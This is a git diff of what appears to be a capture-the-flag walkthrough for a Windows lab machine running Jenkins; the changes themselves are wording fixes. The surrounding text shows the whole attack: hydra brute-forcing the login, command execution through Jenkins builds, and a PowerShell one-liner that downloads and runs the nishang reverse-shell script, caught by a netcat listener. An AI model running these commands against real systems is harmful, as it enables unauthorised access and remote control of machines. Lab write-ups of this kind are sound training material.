@@ -6,7 +6,7 @@
 
 **How many ports are open? (TCP only)**
 
-As always, we're going to start with a aggressive nmap scan on all ports with very verbose output.
+As always, we're going to start with an aggressive nmap scan on all ports with very verbose output.
 
 ```
 nmap 10.10.27.251 -p- -A -vv
@@ -28,7 +28,7 @@ We can gather some information from the site, **alfred@wayneenterprises[.]com**
 
 From the website, we can assume that a username will be alfred. We also have the domain of the emails which may be needed later. Unfortunately, I see no extra information from the source.
 
-Now that the nmap is complete, we can see that this is a Microsoft Windows Server 2012 R2 that is running Jetty(9.4.z-SNAPSHOT) on port 8080. Let's try to visit that port in our browser.
+Now that the nmap is complete, we can see that this is a Microsoft Windows Server 2012 R2 that is running Jetty(9.4.z-SNAPSHOT) on port 8080. Let's try to visit that web server in our browser.
 
 On MACHINE_IP:8080 we can see that there is a Jenkins login form. Let's try to find a way to login to alfred. When we view the source we can see the field names are j_username:j_password and that the error message displayed with incorrect credentials is "Invalid username or password". This will be useful if we need to use hydra to attempt to bruteforce the login form. 
 
@@ -42,7 +42,7 @@ We're going to use hydra to do this but first we need to get the action and meth
 hydra -s 8080 -l afred -P /usr/share/wordlists/rockyou.txt 10.10.27.251 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Login=:Invalid username or password." 
 ```
 
-Unfortunately, after a few minutes I'm going to be moving on from this. Let's go look at jenkins while this is running in the background and find out what the default administrative user is named. Maybe, we can get in with default credentials.
+Unfortunately, after a few minutes I'm going to be moving on from this. Let's go look at jenkins while this is running in the background and find out what the default administrative user is named. Maybe we can get in with default credentials.
 
 After some research, it looks like the default administrator username for jenkins is "admin". Let's run hydra with the http_default_pass.txt in metasploit wordlists to try and get into this account.
 
@@ -88,7 +88,7 @@ C:\Program Files (x86)\Jenkins\workspace\project>exit 0
 Finished: SUCCESS
 ```
 
-So it looks like Jenkins executes the commands as system but is access to a user (alfred/bruce). Let's check and see if we can use powershell. We're in luck the cmd can launch powershell. Let's use [nishang](https://github.com/samratashok/nishang) and transfer Invoke-PowerShellTcp.ps1 to the server using Jenkins and a Simple HTTP server. We will want to launch a netcat listener before we do this, to pickup the shell.
+So it looks like Jenkins executes the commands as system but has access to a user (alfred/bruce) if we were to get a shell. Let's check and see if we can use powershell. We're in luck, the cmd can launch powershell. Let's use [nishang](https://github.com/samratashok/nishang) and transfer Invoke-PowerShellTcp.ps1 to the server using Jenkins and a Simple HTTP server. We will want to launch a netcat listener before we do this, to pickup the shell.
 
 * Move the terminals location to the directory containing Invoke-PowerShellTcp.ps1 and start the server (I made one for this room named Alfred).
 
@@ -102,7 +102,7 @@ python3 -m http.server
 rlwrap nc -lvnp 4444
 ```
 
-* Update and build the following powershell that will transfer and execute the powershell script on the server.
+* Update and build the powershell command in Jenkins to transfer the Invoke-PowerShellTcp.ps1 from the server to the target and execute the script.
 
 ```ps
 powershell iex (New-Object Net.WebClient).DownloadString('http://Tun0-IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress Tun0-IP -Port 4444
@@ -111,8 +111,8 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://Tun0-IP:8000/In
 WIN!
 
 ```
-rlwrap nc -lvnp 9000                                                                                                                                        9 ⚙
-listening on [any] 9000 ...
+rlwrap nc -lvnp 4444                                                                                                                                        9 ⚙
+listening on [any] 4444 ...
 connect to [10.6.40.191] from (UNKNOWN) [10.10.27.251] 49355
 ```
 ```ps
